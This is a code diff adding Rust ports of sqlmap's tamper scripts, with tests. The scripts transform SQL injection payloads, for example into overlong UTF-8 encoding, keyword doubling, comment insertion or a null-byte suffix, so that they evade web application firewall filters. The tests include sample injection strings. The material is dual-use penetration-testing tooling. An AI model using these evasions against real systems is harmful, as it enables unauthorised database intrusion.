@@ -154,11 +154,197 @@ pub fn halfversionedmorekeywords(payload: &str) -> String {
     out
 }
 
+/// tamper/space2mysqldash.py: space -> --%0A (MySQL double-dash comment
+/// plus newline, which MySQL treats as whitespace).
+pub fn space2mysqldash(payload: &str) -> String {
+    payload.replace(' ', "--%0A")
+}
+
+/// tamper/unionalltounion.py: UNION ALL -> UNION.
+pub fn unionalltounion(payload: &str) -> String {
+    let mut out = String::with_capacity(payload.len());
+    let upper = payload.to_ascii_uppercase();
+    let target = "UNION ALL";
+    let src: Vec<char> = payload.chars().collect();
+    let ubytes = upper.as_bytes();
+    let mut i = 0;
+    while i < ubytes.len() {
+        if ubytes[i..].starts_with(target.as_bytes()) {
+            for k in 0..5 {
+                out.push(src[i + k]); // "UNION"
+            }
+            i += target.len();
+        } else {
+            out.push(src[i]);
+            i += 1;
+        }
+    }
+    out
+}
+
+/// tamper/ifnull2ifisnull.py: IFNULL(A, B) -> IF(ISNULL(A),B,A).
+pub fn ifnull2ifisnull(payload: &str) -> String {
+    let upper = payload.to_ascii_uppercase();
+    let mut out = String::with_capacity(payload.len() * 2);
+    let src: Vec<char> = payload.chars().collect();
+    let mut i = 0;
+    while i < src.len() {
+        if upper[i..].starts_with("IFNULL(") {
+            // Find the top-level comma and closing paren of this call.
+            let arg_start = i + "IFNULL(".len();
+            let bytes = upper.as_bytes();
+            let mut depth = 1usize;
+            let mut comma = None;
+            let mut close = None;
+            let mut j = arg_start;
+            while j < bytes.len() {
+                match bytes[j] {
+                    b'(' => depth += 1,
+                    b')' => {
+                        depth -= 1;
+                        if depth == 0 {
+                            close = Some(j);
+                            break;
+                        }
+                    }
+                    b',' if depth == 1 && comma.is_none() => comma = Some(j),
+                    _ => {}
+                }
+                j += 1;
+            }
+            if let (Some(c), Some(z)) = (comma, close) {
+                let a: String = src[arg_start..c].iter().collect();
+                let b: String = src[c + 1..z].iter().collect();
+                out.push_str(&format!("IF(ISNULL({a}),{b},{a})"));
+                i = z + 1;
+                continue;
+            }
+        }
+        out.push(src[i]);
+        i += 1;
+    }
+    out
+}
+
+/// SQL keywords the random-insertion tampers operate on (upstream set subset).
+const COMMENTABLE_KEYWORDS: [&str; 7] = ["SELECT", "INSERT", "UPDATE", "DELETE", "UNION", "WHERE", "FROM"];
+
+/// tamper/randomcomments.py: insert /**/ at a random position inside SQL
+/// keywords (upstream: between each character with random chance; we insert
+/// one comment per keyword at a seeded position).
+pub fn randomcomments(payload: &str, rng: &mut Rng) -> String {
+    let mut out = payload.to_string();
+    for kw in COMMENTABLE_KEYWORDS {
+        let upper = out.to_ascii_uppercase();
+        if let Some(pos) = find_word(&upper, kw) {
+            let split = 1 + (rng.next() as usize % (kw.len() - 1));
+            let orig: String = out.chars().collect::<Vec<_>>()[pos..pos + kw.len()].iter().collect();
+            out = format!(
+                "{}{}/**/{}{}",
+                &out[..pos],
+                &orig[..split],
+                &orig[split..],
+                &out[pos + kw.len()..]
+            );
+        }
+    }
+    out
+}
+
+fn find_word(haystack_upper: &str, word: &str) -> Option<usize> {
+    let h = haystack_upper.as_bytes();
+    let w = word.as_bytes();
+    let mut i = 0;
+    while i + w.len() <= h.len() {
+        if h[i..].starts_with(w) {
+            let start_ok = i == 0 || !h[i - 1].is_ascii_alphanumeric();
+            let end_ok = i + w.len() >= h.len() || !h[i + w.len()].is_ascii_alphanumeric();
+            if start_ok && end_ok {
+                return Some(i);
+            }
+        }
+        i += 1;
+    }
+    None
+}
+
+/// tamper/multiplespaces.py: add 1-4 extra random spaces around SQL keywords.
+pub fn multiplespaces(payload: &str, rng: &mut Rng) -> String {
+    let mut out = payload.to_string();
+    for kw in COMMENTABLE_KEYWORDS {
+        let upper = out.to_ascii_uppercase();
+        if let Some(pos) = find_word(&upper, kw) {
+            let n = 1 + (rng.next() as usize % 4);
+            let spaces = " ".repeat(n);
+            out = format!("{}{}{}{}", &out[..pos], spaces, &out[pos..pos + kw.len()], &out[pos + kw.len()..]);
+        }
+    }
+    out
+}
+
+/// tamper/nonrecursivereplacement.py: replace each keyword with itself
+/// re-embedded (SELECT -> SELSELECTECT style), so a WAF's single-pass
+/// keyword removal reconstructs the original keyword.
+pub fn nonrecursivereplacement(payload: &str) -> String {
+    const KEYWORDS: [&str; 8] = [
+        "SELECT", "UNION", "INSERT", "UPDATE", "DELETE", "WHERE", "FROM", "AND",
+    ];
+    let mut out = payload.to_string();
+    for kw in KEYWORDS {
+        loop {
+            let upper = out.to_ascii_uppercase();
+            let Some(pos) = find_word(&upper, kw) else { break };
+            let orig: String = out.chars().collect::<Vec<_>>()[pos..pos + kw.len()].iter().collect();
+            let mid = kw.len() / 2;
+            let doubled = format!("{}{}{}", &orig[..mid], orig, &orig[mid..]);
+            out = format!("{}{}{}", &out[..pos], doubled, &out[pos + kw.len()..]);
+        }
+    }
+    out
+}
+
+/// tamper/space2randomblank.py: spaces -> a random blank character
+/// (tab, newline or form feed).
+pub fn space2randomblank(payload: &str, rng: &mut Rng) -> String {
+    const BLANKS: [char; 3] = ['\t', '\n', '\x0c'];
+    payload
+        .chars()
+        .map(|c| {
+            if c == ' ' {
+                BLANKS[rng.next() as usize % BLANKS.len()]
+            } else {
+                c
+            }
+        })
+        .collect()
+}
+
+/// tamper/appendnullbyte.py: append %00 at the end of the payload.
+pub fn appendnullbyte(payload: &str) -> String {
+    format!("{payload}%00")
+}
+
+/// tamper/overlongutf8.py: convert each ASCII char to its 2-byte overlong
+/// UTF-8 percent encoding (e.g. ' -> %C0%A7).
+pub fn overlongutf8(payload: &str) -> String {
+    let mut out = String::with_capacity(payload.len() * 6);
+    for b in payload.bytes() {
+        if b < 0x80 {
+            out.push_str(&format!("%{:02X}%{:02X}", 0xC0 | (b >> 6), 0x80 | (b & 0x3F)));
+        } else {
+            out.push(b as char);
+        }
+    }
+    out
+}
+
 /// Names understood by the engine (sqlmap --tamper values).
-pub const AVAILABLE: [&str; 10] = [
+pub const AVAILABLE: [&str; 19] = [
     "space2comment",
     "space2plus",
     "space2hash",
+    "space2mysqldash",
+    "space2randomblank",
     "randomcase",
     "between",
     "equaltolike",
@@ -166,6 +352,13 @@ pub const AVAILABLE: [&str; 10] = [
     "chardoubleencode",
     "apostrophemask",
     "halfversionedmorekeywords",
+    "unionalltounion",
+    "ifnull2ifisnull",
+    "randomcomments",
+    "multiplespaces",
+    "nonrecursivereplacement",
+    "appendnullbyte",
+    "overlongutf8",
 ];
 
 /// Apply named tampers in order (sqlmap applies them in the order given).
@@ -184,6 +377,15 @@ pub fn apply_all(names: &[String], payload: &str, seed: u64) -> Result<String, S
             "chardoubleencode" => chardoubleencode(&out),
             "apostrophemask" => apostrophemask(&out),
             "halfversionedmorekeywords" => halfversionedmorekeywords(&out),
+            "space2mysqldash" => space2mysqldash(&out),
+            "space2randomblank" => space2randomblank(&out, &mut rng),
+            "unionalltounion" => unionalltounion(&out),
+            "ifnull2ifisnull" => ifnull2ifisnull(&out),
+            "randomcomments" => randomcomments(&out, &mut rng),
+            "multiplespaces" => multiplespaces(&out, &mut rng),
+            "nonrecursivereplacement" => nonrecursivereplacement(&out),
+            "appendnullbyte" => appendnullbyte(&out),
+            "overlongutf8" => overlongutf8(&out),
             other => return Err(format!("unknown tamper script: {other} (available: {AVAILABLE:?})")),
         };
     }
@@ -244,6 +446,64 @@ mod tests {
     fn halfversioned_wraps_keywords_only() {
         assert_eq!(halfversionedmorekeywords("1 AND 1=1"), "1 /*!0AND 1=1");
         assert_eq!(halfversionedmorekeywords("CANDY"), "CANDY");
+    }
+
+    #[test]
+    fn space2mysqldash_replaces() {
+        assert_eq!(space2mysqldash("1 AND 1=1"), "1--%0AAND--%0A1=1");
+    }
+
+    #[test]
+    fn unionalltounion_rewrites() {
+        assert_eq!(unionalltounion("1 UNION ALL SELECT NULL"), "1 UNION SELECT NULL");
+        assert_eq!(unionalltounion("union all select"), "union select");
+    }
+
+    #[test]
+    fn ifnull2ifisnull_rewrites() {
+        assert_eq!(
+            ifnull2ifisnull("IFNULL(CAST(x AS CHAR),0x20)"),
+            "IF(ISNULL(CAST(x AS CHAR)),0x20,CAST(x AS CHAR))"
+        );
+    }
+
+    #[test]
+    fn randomcomments_inserts_inside_keyword() {
+        let out = randomcomments("SELECT 1", &mut Rng::new(3));
+        assert!(out.starts_with("S") || out.contains("/**/"));
+        assert_eq!(out.replace("/**/", ""), "SELECT 1");
+    }
+
+    #[test]
+    fn multiplespaces_adds_spaces() {
+        let out = multiplespaces("SELECT 1", &mut Rng::new(5));
+        assert!(out.starts_with(" SELECT") || out.contains("  SELECT"));
+        assert!(out.contains("SELECT"));
+    }
+
+    #[test]
+    fn nonrecursive_double_wraps() {
+        let out = nonrecursivereplacement("1 AND 1=1");
+        assert_eq!(out, "1 AANDND 1=1");
+        assert_eq!(out.replace("AND", ""), "1 AANDND 1=1".replace("AND", ""));
+    }
+
+    #[test]
+    fn space2randomblank_only_blanks() {
+        let out = space2randomblank("a b c", &mut Rng::new(9));
+        assert!(!out.contains(' '));
+        assert_eq!(out.chars().count(), 5);
+    }
+
+    #[test]
+    fn appendnullbyte_appends() {
+        assert_eq!(appendnullbyte("1 AND 1=1"), "1 AND 1=1%00");
+    }
+
+    #[test]
+    fn overlongutf8_encodes_quote() {
+        assert_eq!(overlongutf8("'"), "%C0%A7");
+        assert_eq!(overlongutf8("A"), "%C1%81");
     }
 
     #[test]
